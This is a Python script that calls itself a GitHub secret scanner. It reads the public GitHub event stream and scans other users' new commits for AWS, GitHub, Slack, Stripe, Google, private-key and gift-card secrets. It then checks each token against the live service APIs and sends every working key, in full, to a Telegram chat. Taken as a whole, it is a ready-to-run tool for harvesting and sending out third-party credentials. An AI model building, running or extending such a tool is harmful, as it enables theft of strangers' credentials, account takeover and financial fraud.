#!/usr/bin/env python3
"""GitHub Secret Scanner – GitHub Actions (stateless, single run)"""
import asyncio, aiohttp, logging, re, math, sys, json, time, os
from datetime import datetime, timezone
import requests

# --- Config ---
VERIFY_CONCURRENCY = 10
LOG_FILE = "live_keys.log"
ENTROPY_THRESHOLD = 3.8
MIN_ENTROPY_STRING_LENGTH = 16
MAX_ENTROPY_STRING_LENGTH = 128
LAST_TIMESTAMP_FILE = "last_timestamp.txt"

# --- Telegram ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
def send_telegram(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=10)
    except: pass

# --- Patterns ---
PATTERNS = [
    (r'(?:A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}', 'AWS Access Key', None),
    (r'(?i)aws(.{0,20})?(?-i)["\']([0-9a-zA-Z\/+]{40})["\']', 'AWS Secret Key', None),
    (r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}', 'GitHub Token', 'verify_github'),
    (r'xox[baprs]-[a-zA-Z0-9-]+', 'Slack Token', 'verify_slack'),
    (r'sk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Key', 'verify_stripe'),
    (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key', 'verify_google'),
    (r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key', None),
    (r'(?i)(giftcard|reward|loyalty)(_key|_token|secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{32,64})["\']', 'Gift Card Key', None),
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', stream=sys.stdout)
logger = logging.getLogger(__name__)

def shannon_entropy(data: str) -> float:
    if not data: return 0.0
    entropy = 0.0
    for x in range(256):
        p_x = data.count(chr(x)) / len(data)
        if p_x > 0: entropy += - p_x * math.log2(p_x)
    return entropy

def extract_strings_from_diff(diff_text):
    candidates = []
    for line in diff_text.split('\n'):
        if line.startswith('+') and not line.startswith('+++'):
            content = line[1:].strip()
            tokens = re.findall(r'["\']([^"\']{16,})["\']|\b([A-Za-z0-9_\-+/=]{16,})\b', content)
            for t in tokens:
                token = t[0] if t[0] else t[1]
                if len(token) >= MIN_ENTROPY_STRING_LENGTH:
                    candidates.append(token)
    return candidates

def scan_diff(diff_text):
    findings = []
    for pattern, service, verifier in PATTERNS:
        matches = re.findall(pattern, diff_text, re.IGNORECASE|re.MULTILINE)
        for match in matches:
            token = match if isinstance(match, str) else next((m for m in match if m and len(m)>10), None)
            if token:
                findings.append({'token': token, 'service': service, 'verifier': verifier})
    seen = set(f['token'] for f in findings)
    for token in extract_strings_from_diff(diff_text):
        if token in seen or len(token) > MAX_ENTROPY_STRING_LENGTH: continue
        if shannon_entropy(token) >= ENTROPY_THRESHOLD:
            findings.append({'token': token, 'service': 'High Entropy String', 'verifier': None})
    return findings

class GitHub:
    def __init__(self, token):
        self.token = token
        self.session = None
    async def _init(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                headers={'Authorization': f'token {self.token}', 'Accept': 'application/vnd.github.v3+json'},
                timeout=aiohttp.ClientTimeout(total=30))
    async def fetch_events_since(self, since_iso):
        await self._init()
        url = 'https://api.github.com/events'
        params = {'per_page': 100, 'since': since_iso}
        for attempt in range(3):
            try:
                async with self.session.get(url, params=params) as resp:
                    if resp.status == 403 and resp.headers.get('X-RateLimit-Remaining') == '0':
                        sleep = max(int(resp.headers.get('X-RateLimit-Reset', time.time()+60)) - time.time(), 1)
                        logger.warning(f"Rate limited, sleeping {sleep}s")
                        await asyncio.sleep(sleep)
                        continue
                    if resp.status != 200:
                        logger.error(f"Events API error {resp.status}")
                        return []
                    events = await resp.json()
                    break
            except Exception as e:
                logger.warning(f"Attempt {attempt+1} failed: {e}")
                if attempt == 2: return []
                await asyncio.sleep(1)
        return [e for e in events if e['type'] == 'PushEvent']

    async def get_diff(self, repo, sha):
        await self._init()
        url = f'https://api.github.com/repos/{repo}/commits/{sha}'
        headers = {'Accept': 'application/vnd.github.v3.diff'}
        try:
            async with self.session.get(url, headers=headers) as resp:
                if resp.status == 200: return await resp.text()
                logger.warning(f"Diff failed {repo}@{sha}: {resp.status}")
        except Exception as e:
            logger.warning(f"Diff error: {e}")
        return None

    async def close(self):
        if self.session: await self.session.close()

async def verifier_class():
    # Simple inline verifiers
    sem = asyncio.Semaphore(10)
    s = None
    async def _s():
        nonlocal s
        if not s: s = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))
    async def gh(tok):
        await _s()
        async with sem:
            try:
                async with s.get('https://api.github.com/user', headers={'Authorization': f'token {tok}'}) as resp:
                    return resp.status == 200
            except: return False
    async def slack(tok):
        await _s()
        async with sem:
            try:
                async with s.post('https://slack.com/api/auth.test', headers={'Authorization': f'Bearer {tok}'}) as resp:
                    return (await resp.json()).get('ok', False)
            except: return False
    async def stripe(key):
        await _s()
        async with sem:
            try:
                async with s.get('https://api.stripe.com/v1/balance', headers={'Authorization': f'Bearer {key}'}) as resp:
                    return resp.status == 200
            except: return False
    async def google(key):
        await _s()
        async with sem:
            try:
                async with s.get('https://www.googleapis.com/oauth2/v1/tokeninfo', params={'access_token': key}) as resp:
                    return resp.status == 200
            except: return False
    return gh, slack, stripe, google, s

async def main():
    token = os.environ.get("GITHUB_TOKEN")
    if not token:
        logger.error("GITHUB_TOKEN not set")
        return
    gh = GitHub(token)
    # Read last timestamp
    try:
        with open(LAST_TIMESTAMP_FILE, 'r') as f:
            last_ts = f.read().strip()
    except:
        last_ts = datetime.now(timezone.utc).replace(second=0,microsecond=0).isoformat() + 'Z'
    since_iso = last_ts
    events = await gh.fetch_events_since(since_iso)
    if not events:
        logger.info("No new events")
        return
    logger.info(f"Fetched {len(events)} PushEvents since {since_iso}")
    v_gh, v_slack, v_stripe, v_google, ver_sess = await verifier_class()
    found_any = False
    for ev in events:
        repo = ev['repo']['name']
        for commit in ev['payload'].get('commits', []):
            sha = commit['sha']
            diff = await gh.get_diff(repo, sha)
            if not diff: continue
            findings = scan_diff(diff)
            if not findings: continue
            logger.info(f"Found {len(findings)} candidate(s) in {repo}@{sha[:7]}")
            found_any = True
            for f in findings:
                verifier = f['verifier']
                valid = None
                if verifier == 'verify_github': valid = await v_gh(f['token'])
                elif verifier == 'verify_slack': valid = await v_slack(f['token'])
                elif verifier == 'verify_stripe': valid = await v_stripe(f['token'])
                elif verifier == 'verify_google': valid = await v_google(f['token'])
                if valid is True:
                    alert = f"[LIVE KEY] {f['service']}: {f['token']} (repo: {repo}, commit: {sha})"
                    logger.warning(alert)
                    with open(LOG_FILE, 'a') as lf: lf.write(json.dumps(f)+'\n')
                    send_telegram(alert)
                elif valid is False:
                    logger.info(f"[DEAD] {f['service']}: {f['token']}")
                else:
                    logger.info(f"[UNKNOWN] {f['service']}: {f['token']}")
    # Update timestamp to now
    new_ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
    with open(LAST_TIMESTAMP_FILE, 'w') as f:
        f.write(new_ts)
    logger.info(f"Run complete, updated timestamp to {new_ts}")
    if ver_sess: await ver_sess.close()
    await gh.close()

if __name__ == '__main__':
    asyncio.run(main())
